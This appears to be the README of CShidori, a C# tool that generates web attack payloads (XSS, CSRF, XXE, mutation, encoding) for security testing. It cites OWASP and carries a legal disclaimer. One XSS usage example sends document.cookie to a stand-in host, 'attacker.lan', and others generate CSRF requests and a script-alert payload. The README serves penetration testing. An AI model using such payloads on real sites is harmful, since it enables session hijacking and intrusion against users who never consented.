# CShidori

A C# "Thousand Birds" Payloads Generator

## Disclaimer

Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.

## References

OWASP Web Application Security Testing Guide: [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
Taisen: [Website](https://taisen.fr)

## supported modes/payloads

- Mutation
- XSS
- JSON
- XML
- GET
- CSRF
- XXE
- Encoding
- List Dump

## Usage

### Mutation

```powershell
.\CShidori.exe -m mut -o 5 -p test
```

### XSS / Injections

```powershell
.\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
```

### JSON

```powershell
.\CShidori.exe -m json -p ..\testing\test.json
```

### XML

```powershell
.\CShidori.exe -m xml -p ..\testing\exemple.xml
```

### GET

```powershell
.\CShidori.exe -m get -p "?bar=foo&foo=bar"
```

### CSRF

```powershell
.\CShidori.exe -m csrf -o get -p http://target.lan -i "name1=value1&name2=value2"
.\CShidori.exe -m csrf -o post -p http://target.lan -i "name1=value1&name2=value2"
```

### XXE

```powershell
.\CShidori.exe -m xxe -o file
.\CShidori.exe -m xxe -o call 
.\CShidori.exe -m xxe -o all 
```
### Encode

```powershell
.\CShidori.exe -m enc -p "<script>alert(1)</script>"
```

### Dump

```powershell
.\CShidori.exe -m bs
```

## Miscellaneous

### CShidori-Spring.ps1

Security hotspots, endpoints, parameters and wsdl grabber from Spring projects

```powershell
. .\Spring-parser.ps1
Get-SpringArtefact -source .\project\repository -output .
```

### SOAP & XSD

Removed since you can perform it from Visual Studio:
- Merge all XSD files in WSDL file
- Right click on the project and select "Add Service Reference" -> "WCF" -> "enter localPath"
